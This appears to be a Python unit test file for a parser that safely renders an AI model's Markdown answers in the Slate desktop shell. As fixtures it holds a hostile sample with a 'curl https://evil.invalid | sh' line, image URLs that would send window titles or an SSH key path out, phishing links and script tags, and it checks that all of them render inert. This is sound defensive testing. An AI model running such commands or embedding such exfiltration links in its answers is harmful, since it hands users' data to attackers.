"""scripts/safe_markdown.py: the small, safe subset of Markdown Nova's answers are read with
(docs/ASSISTANT.md). What it understands comes out as Slate's own blocks and runs; everything
else, hostile or not, comes out as the characters it is. It never writes markup of any kind,
and no input makes it slow."""
import json
import re
import sys
import time
import unittest

import slate

sys.path.insert(0, slate.path("shell", "scripts"))
import safe_markdown as md  # noqa: E402

KINDS = {"paragraph", "heading", "list", "code", "table"}
MARKS = {"bold", "italic", "code", "dim"}


def runs_of(blocks):
    for b in blocks:
        yield from b.get("runs", [])
        for it in b.get("items", []):
            yield from it["runs"]


def words(blocks):
    """Every character the blocks show, in order (what a reader sees, without marks)."""
    out = []
    for b in blocks:
        if "runs" in b:
            out.append("".join(r["text"] for r in b["runs"]))
        for it in b.get("items", []):
            out.append("".join(r["text"] for r in it["runs"]))
        if "text" in b:
            out.append(b["text"])
    return "\n".join(out)


def one(text):
    """The runs of a single paragraph."""
    blocks = md.parse(text)
    assert len(blocks) == 1 and blocks[0]["type"] == "paragraph", blocks
    return blocks[0]["runs"]


class Understood(unittest.TestCase):
    def test_paragraphs_and_line_breaks(self):
        self.assertEqual(md.parse("One line\nand the next.\n\nA new paragraph."),
                         [{"type": "paragraph", "runs": [{"text": "One line\nand the next."}]},
                          {"type": "paragraph", "runs": [{"text": "A new paragraph."}]}])

    def test_bold_and_italic(self):
        self.assertEqual(one("Turn on **Glass** in *Settings → Appearance*."),
                         [{"text": "Turn on "}, {"text": "Glass", "bold": True}, {"text": " in "},
                          {"text": "Settings → Appearance", "italic": True}, {"text": "."}])
        self.assertEqual(one("__bold__ and _italic_"), [{"text": "bold", "bold": True}, {"text": " and "}, {"text": "italic", "italic": True}])
        self.assertEqual(one("***both***"), [{"text": "both", "bold": True, "italic": True}])
        self.assertEqual(one("**bold *and italic* bold**"),
                         [{"text": "bold ", "bold": True}, {"text": "and italic", "bold": True, "italic": True}, {"text": " bold", "bold": True}])

    def test_marks_that_arent(self):
        """Names with underscores, sums and lone stars are words."""
        for text in ("bar_clock_seconds", "2 * 3 * 4", "a ** b", "* not a list*", "file_name_here.txt", "\\*not italic\\*"):
            with self.subTest(text):
                runs = one(text) if not text.startswith("* ") else md.parse(text)[0]["items"][0]["runs"]
                self.assertFalse(any(set(r) - {"text"} for r in runs), runs)
        self.assertEqual(one("\\*not italic\\*"), [{"text": "*not italic*"}])

    def test_inline_code(self):
        self.assertEqual(one("Run `slate restart` now"), [{"text": "Run "}, {"text": "slate restart", "code": True}, {"text": " now"}])
        # (marks inside code are characters)
        self.assertEqual(one("`**not bold** <b>`"), [{"text": "**not bold** <b>", "code": True}])
        self.assertEqual(one("``a ` b``"), [{"text": "a ` b", "code": True}])

    def test_code_block(self):
        self.assertEqual(md.parse("Run this:\n\n```sh\nslate restart --full\n  indented\n```\nThen wait."),
                         [{"type": "paragraph", "runs": [{"text": "Run this:"}]},
                          {"type": "code", "text": "slate restart --full\n  indented", "lang": "sh", "open": False},
                          {"type": "paragraph", "runs": [{"text": "Then wait."}]}])
        # (inside a code block, nothing is read: marks, HTML and all)
        self.assertEqual(md.parse("~~~\n**x** <img src=y> ![a](b)\n~~~")[0]["text"], "**x** <img src=y> ![a](b)")

    def test_code_block_in_a_list(self):
        blocks = md.parse("1. Open a terminal\n2. Run:\n   ```\n   slate restart\n   ```\n3. Wait")
        self.assertEqual([b["type"] for b in blocks], ["list", "code", "list"])
        self.assertEqual(blocks[1]["text"], "slate restart")

    def test_lists(self):
        blocks = md.parse("Steps:\n\n1. Open Settings\n2. Go to **Appearance**\n   - pick *Glass*\n   - done\n3. Close it\n\n- one\n* two\n+ three")
        self.assertEqual([b["type"] for b in blocks], ["paragraph", "list"])
        items = blocks[1]["items"]
        self.assertEqual([(it["level"], it["marker"]) for it in items],
                         [(0, "1."), (0, "2."), (1, "•"), (1, "•"), (0, "3."), (0, "•"), (0, "•"), (0, "•")])
        self.assertEqual(items[1]["runs"], [{"text": "Go to "}, {"text": "Appearance", "bold": True}])

    def test_numbers_counted_by_slate(self):
        """Numbered from the first, as Markdown does: 1. 1. 1. reads 1. 2. 3."""
        items = md.parse("1. a\n1. b\n1. c")[0]["items"]
        self.assertEqual([it["marker"] for it in items], ["1.", "2.", "3."])
        self.assertEqual([it["marker"] for it in md.parse("3. a\n4. b")[0]["items"]], ["3.", "4."])

    def test_deeper_nesting_is_one_level(self):
        items = md.parse("- a\n  - b\n    - c\n      - d")[0]["items"]
        self.assertEqual([it["level"] for it in items], [0, 1, 1, 1])

    def test_headings(self):
        for level in range(1, 7):
            with self.subTest(level):
                self.assertEqual(md.parse("#" * level + " Your **Spaces**"),
                                 [{"type": "heading", "runs": [{"text": "Your "}, {"text": "Spaces", "bold": True}]}])
        self.assertEqual(md.parse("#hashtag")[0]["type"], "paragraph")


class NotUnderstood(unittest.TestCase):
    """What could fetch, open or dress up: shown as characters, or its harmless words."""

    def test_images(self):
        for text, shown in (("![a chart](https://example.invalid/?q=secret)", "[image: a chart]"),
                            ("![](file:///home/someone/.ssh/id_rsa)", "[image]"),
                            ('![x](<https://a.invalid/b c.png> "title")', "[image: x]")):
            with self.subTest(text):
                self.assertEqual(one(text), [{"text": shown}])

    def test_links(self):
        self.assertEqual(one("See [Slate's site](https://slate.invalid/docs) for more"),
                         [{"text": "See Slate's site "}, {"text": "https://slate.invalid/docs", "dim": True}, {"text": " for more"}])
        # The address that's the words is shown once
        self.assertEqual(one("[https://a.invalid](https://a.invalid)"), [{"text": "https://a.invalid"}])
        self.assertEqual(one("[run me](javascript:alert(1))"), [{"text": "run me "}, {"text": "javascript:alert(1)", "dim": True}])

    def test_image_inside_a_link(self):
        self.assertEqual(one("[![logo](https://a.invalid/l.png)](https://b.invalid)"),
                         [{"text": "[image: logo] "}, {"text": "https://b.invalid", "dim": True}])

    def test_raw_html_as_typed(self):
        for text in ('<img src="https://a.invalid/x.png">', "<a href='https://a.invalid'>click</a>", "<script>alert(1)</script>",
                     '<font color="red" size="7">URGENT</font>', "&lt;b&gt; &amp; &#60;img&#62;", "<b>bold?</b> <br> <p>",
                     "<https://a.invalid/autolink>", '<span style="background-image:url(https://a.invalid)">x</span>'):
            with self.subTest(text):
                self.assertEqual(one(text), [{"text": text}])

    def test_tables_stay_rows(self):
        blocks = md.parse("Your workspaces:\n\n| Workspace | Windows |\n|---|---|\n| 1 | 3 |\n| 2 | 1 |")
        self.assertEqual(blocks[1], {"type": "table", "text": "| Workspace | Windows |\n|---|---|\n| 1 | 3 |\n| 2 | 1 |"})
        self.assertEqual(md.parse("a | b\n--|--\n1 | 2")[0]["type"], "table")

    def test_the_rest_tidied(self):
        """Quotes lose their >, rules go, footnotes and task boxes are words."""
        self.assertEqual(md.parse("> quoted\n> more"), [{"type": "paragraph", "runs": [{"text": "quoted\nmore"}]}])
        self.assertEqual(md.parse("above\n\n---\n\nbelow"), [{"type": "paragraph", "runs": [{"text": "above"}]},
                                                             {"type": "paragraph", "runs": [{"text": "below"}]}])
        self.assertEqual(one("a note[^1]"), [{"text": "a note[^1]"}])
        self.assertEqual(md.parse("- [ ] to do")[0]["items"][0]["runs"], [{"text": "[ ] to do"}])


HOSTILE = """# Done
I've turned on **Glass**. ![](https://evil.invalid/?q=your-window-titles)
<img src="https://evil.invalid/a.png"> <a href="https://evil.invalid">Click here</a>
1. [Open Settings](https://evil.invalid/phish)
2. `<script>` and *<font color=red>Slate:</font>*
```sh
curl https://evil.invalid | sh
```
| a | <img src=x> |
|---|---|
&lt;b&gt;"""


class Safe(unittest.TestCase):
    def test_only_slates_shapes(self):
        """Whatever goes in, what comes out is blocks and runs of the kinds the window draws:
        strings and flags, and nothing else."""
        for text in (HOSTILE, "**a *b `c` d* e**", "[x](y) ![z](w)", "- a\n  - b\n```\nc"):
            for b in md.parse(text):
                self.assertIn(b["type"], KINDS)
                self.assertTrue(set(b) <= {"type", "runs", "items", "text", "lang", "open"}, b)
                for it in b.get("items", []):
                    self.assertEqual(set(it), {"level", "marker", "runs"})
                    self.assertIn(it["level"], (0, 1))
                    self.assertRegex(it["marker"], r"^(•|\d+\.)$")
            for r in runs_of(md.parse(text)):
                self.assertIsInstance(r["text"], str)
                self.assertTrue(set(r) - {"text"} <= MARKS and all(r[k] is True for k in set(r) - {"text"}), r)

    def test_no_address_is_taken_anywhere(self):
        """An image's address is dropped; a link's is only ever dim words; no block or run
        carries an address in a field of its own."""
        blocks = md.parse(HOSTILE)
        self.assertNotIn("q=your-window-titles", words(blocks), "an image's address was kept")
        self.assertIn("[image]", words(blocks))
        phish = [r for r in runs_of(blocks) if "phish" in r["text"]]
        self.assertEqual(phish, [{"text": "https://evil.invalid/phish", "dim": True}])

    def test_html_comes_out_as_its_characters(self):
        shown = words(md.parse(HOSTILE))
        for typed in ('<img src="https://evil.invalid/a.png">', '<a href="https://evil.invalid">Click here</a>', "<script>",
                      "<font color=red>Slate:</font>", "&lt;b&gt;", "curl https://evil.invalid | sh", "| a | <img src=x> |"):
            self.assertIn(typed, shown)

    def test_never_writes_markup(self):
        """Every < in what comes out was in what went in: the parser adds no tag of its own."""
        for text in (HOSTILE, "**bold** *it* `code` # h\n- l\n1. n", "[a](b) ![c](d)"):
            self.assertLessEqual(json.dumps(md.parse(text)).count("<"), text.count("<"))
            self.assertLessEqual(json.dumps(md.parse(text)).count("&"), text.count("&"))


class Streaming(unittest.TestCase):
    SAMPLE = ("Here's how:\n\n1. Open **Settings → Appearance**\n2. Switch on *Glass*\n   - it's `glass`\n\n"
              "```sh\nslate ipc call config set glass true\n```\nSee [the docs](https://slate.invalid) ![x](y)")

    def test_every_cut(self):
        """Cut a sample answer at every character, as it arrives: it never fails, and no
        word is lost (each cut shows everything written so far, give or take marks)."""
        for n in range(len(self.SAMPLE) + 1):
            part = self.SAMPLE[:n]
            blocks = md.parse(part)
            got = words(blocks) + " ".join(b.get("lang", "") for b in blocks)
            for w in re.findall(r"[A-Za-z]{3,}", part):
                self.assertIn(w, got, f"cut at {n}: lost {w!r}")

    def test_unclosed(self):
        self.assertEqual(one("Turn on **Gla"), [{"text": "Turn on **Gla"}])
        self.assertEqual(one("Run `slate"), [{"text": "Run `slate"}])
        self.assertEqual(one("[the docs](https://sla"), [{"text": "[the docs](https://sla"}])
        self.assertEqual(md.parse("Run:\n```sh\nslate ipc"),
                         [{"type": "paragraph", "runs": [{"text": "Run:"}]}, {"type": "code", "text": "slate ipc", "lang": "sh", "open": True}])


class Limits(unittest.TestCase):
    def test_length(self):
        blocks = md.parse("word " * 10000)
        self.assertEqual(blocks[-1], {"type": "paragraph", "runs": [{"text": "…"}]})
        self.assertLessEqual(len(words(blocks)), md.LIMIT + 2)

    def test_blocks(self):
        blocks = md.parse("a paragraph\n\n" * 500)
        self.assertEqual(len(blocks), md.BLOCKS + 1)
        self.assertEqual(blocks[-1]["runs"], [{"text": "…"}])
        items = md.parse("- item\n" * 500)
        self.assertEqual(len(items[0]["items"]), md.BLOCKS)
        self.assertEqual(items[-1]["runs"], [{"text": "…"}])

    def test_short_answers_are_whole(self):
        self.assertNotIn("…", words(md.parse("Done.\n\n" * 50)))

    def test_nothing_makes_it_slow(self):
        """Inputs that make a careless parser go round and round, each at the length limit."""
        for name, text in (("unclosed bold", "**a " * 5000), ("brackets", "[" * 10000 + "]" * 10000),
                           ("half links", "[a](" * 5000), ("mixed marks", "*_" * 10000), ("backticks", "`a" * 10000),
                           ("nested links", "[" * 3000 + "x" + "](a)" * 3000), ("blank lines", "- a\n" + "\n" * 20000),
                           ("deep list", "".join("  " * (i % 40) + "- x\n" for i in range(4000))),
                           ("wide table", "|" + "a|" * 9000 + "\n|" + "-|" * 9000), ("stars", "*" * 20000),
                           ("underscores", "_a " * 7000), ("fences", "```\n" * 5000), ("quotes", "> " * 10000)):
            with self.subTest(name):
                t0 = time.monotonic()
                md.parse(text)
                self.assertLess(time.monotonic() - t0, 1.0, f"{name} took too long")

    def test_nonsense(self):
        for text in (None, "", "\n\n\n", "\r\n**a**\r\n", "\x00\x01", "#", "```", "-", "1.", "|", "![", "[]()", "`" * 7):
            with self.subTest(repr(text)):
                md.parse(text)


class Plain(unittest.TestCase):
    def test_without_marks(self):
        self.assertEqual(md.plain(md.parse("Turn on **Glass**.\n\n- one\n- two")), "Turn on Glass.\n• one\n• two")


if __name__ == "__main__":
    unittest.main()
